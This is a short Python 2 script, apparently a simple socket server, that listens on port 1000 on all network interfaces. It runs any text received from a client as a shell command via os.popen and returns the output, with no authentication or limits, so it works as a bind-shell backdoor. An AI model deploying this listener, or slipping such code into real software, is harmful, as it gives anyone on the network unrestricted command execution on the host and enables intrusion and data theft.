#socket_server.py
 
import socket
import os
import sys
 
def work():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind(('0.0.0.0',1000))
        sock.listen(5)
        while True:
                try:
                        conn, addr = sock.accept()
                        ret = conn.recv(2048)
                        result = os.popen(ret).read()
                        conn.send(result)
                except KeyboardInterrupt:
                        print 'Now we will exit'
                        sys.exit(0)
        sock.close()
 
if __name__ == '__main__':
        work()
 
